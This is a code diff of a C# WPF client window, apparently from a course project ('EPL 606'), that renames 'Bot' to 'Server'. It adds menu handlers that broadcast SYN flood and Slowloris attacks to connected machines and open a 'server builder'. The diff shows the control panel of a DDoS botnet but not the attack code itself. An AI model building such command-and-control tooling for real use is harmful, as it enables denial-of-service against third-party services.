@@ -24,11 +24,12 @@ namespace Client
     public partial class MainWindow : Window
     {   
         ConnectionManager Connections = new ConnectionManager();
-        int TotalBotsConnected = 0;
+        int TotalServersConnected = 0;
 
-        List<Bot> items { get; set; }
+        List<Server> items { get; set; }
 
         AttackWindow _attackWindow { get; set; }
+        ServerBuilder _serverBuilder { get; set; }
         public MainWindow()
         {
             InitializeComponent();
@@ -36,10 +37,10 @@ namespace Client
             Title = "EPL 606 - Client";
 
             //Setup Item source for thhe listview
-            lvBots.ItemsSource = items = new List<Bot>();
+            lvServers.ItemsSource = items = new List<Server>();
 
-            //Register for Bot notifications
-            Connections.OnBotChange += OnBotChange;
+            //Register for Server notifications
+            Connections.OnServerChange += OnServersChange;
             Connections.OnResponceReceived += OnResponceReceived;
 
         }
@@ -73,7 +74,7 @@ namespace Client
 
                 match.ComputerId = Info;
                 match.IP = RemoteIP;
-                lvBots.Items.Refresh();
+                lvServers.Items.Refresh();
 
             }));
         
@@ -86,36 +87,36 @@ namespace Client
 
                 double? lag = responce.Data.First() as double?;
                 match.Lag = (int)lag;
-                lvBots.Items.Refresh();
+                lvServers.Items.Refresh();
 
             }));
 
         }
 
-        private void OnBotChange(object sender, ConnectionEventArgs e)
+        private void OnServersChange(object sender, ConnectionEventArgs e)
         {
 
             if (Application.Current == null)
                 return;
 
             if(e.ConnectionType == 0)
-                Application.Current.Dispatcher.Invoke(new Action(() => { AddBotToList(e); }));             //Add to our ListView
+                Application.Current.Dispatcher.Invoke(new Action(() => { AddServerToList(e); }));             //Add to our ListView
             else
-                Application.Current.Dispatcher.Invoke(new Action(() => { RemoveBotFromList(e); }));            //Remove from list
+                Application.Current.Dispatcher.Invoke(new Action(() => { RemoveServerFromList(e); }));            //Remove from list
         }
 
-        private void AddBotToList(ConnectionEventArgs e)
+        private void AddServerToList(ConnectionEventArgs e)
         {
             if (e.Id == Guid.Empty)
                 return;
 
-            items.Add(new Bot() { No = TotalBotsConnected, Id = e.Id, IP = e.RemoteIp });
-            lvBots.Items.Refresh();
+            items.Add(new Server() { No = TotalServersConnected, Id = e.Id, IP = e.RemoteIp });
+            lvServers.Items.Refresh();
 
-            TotalBotsConnected++;
+            TotalServersConnected++;
         }
 
-        private void RemoveBotFromList(ConnectionEventArgs e)
+        private void RemoveServerFromList(ConnectionEventArgs e)
         {
             if (e.Id == Guid.Empty)
                 return;
@@ -126,7 +127,7 @@ namespace Client
                 return;
 
             items.Remove(match);
-            lvBots.Items.Refresh();
+            lvServers.Items.Refresh();
         }
 
         private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
@@ -137,18 +138,45 @@ namespace Client
 
         private void SynFloodItem_Click(object sender, RoutedEventArgs e)
         {
-            _attackWindow = new AttackWindow(Connections,1,"Broadcast Syn Flood");
+            _attackWindow = new AttackWindow(Connections,1,"Broadcast SYN Flood Attack");
             _attackWindow.Owner = this;
 
             if(_attackWindow.ShowDialog() == true)
             {
-                int stop = 1;
                // Broadcast Window closed
             }
 
         }
 
+        private void SlowlorisItem_Click(object sender, RoutedEventArgs e)
+        {
+            _attackWindow = new AttackWindow(Connections, 2, "Broadcast Slowloris Attack");
+            _attackWindow.Owner = this;
 
+            if (_attackWindow.ShowDialog() == true)
+            {
+                // Broadcast Attack Window closed
+            }
+
+        }
+        private void ServerBuilderItem_Click(object sender, RoutedEventArgs e)
+        {
+            _serverBuilder = new ServerBuilder();
+            _serverBuilder.Owner = this;
+
+            if (_serverBuilder.ShowDialog() == true)
+            {
+                // Server Window closed
+            }
+        
+        }
+        private void ExitItem_Click(object sender, RoutedEventArgs e)
+        {
+            Application.Current.Shutdown();
+
+        }
+        
+        
        
 
        
